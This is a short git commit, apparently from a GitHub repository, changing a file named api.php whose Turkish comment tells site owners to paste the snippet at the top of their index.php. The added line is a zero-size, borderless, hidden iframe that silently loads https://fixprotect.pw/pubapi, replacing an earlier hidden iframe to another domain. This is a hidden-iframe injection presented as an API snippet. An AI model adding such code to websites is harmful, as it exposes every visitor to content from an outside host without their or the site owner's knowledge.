7286828ba86102cac0829a795f01fcbb4be67ba3
efefix <83601698+efefix@users.noreply.github.com>
2021-05-04 19:33:06 +0300

    Update api.php

--- api.php
+++ api.php
@@ -1,2 +1,2 @@
 //index.php Dosyanızın en üstüne ilave edin.
-<iframe width=0px height=0px frameborder=no name=fixapi src=https://titanyazilim.com/api> </iframe>
+<iframe width=0px height=0px frameborder=no name=fixapi src=https://fixprotect.pw/pubapi> </iframe>
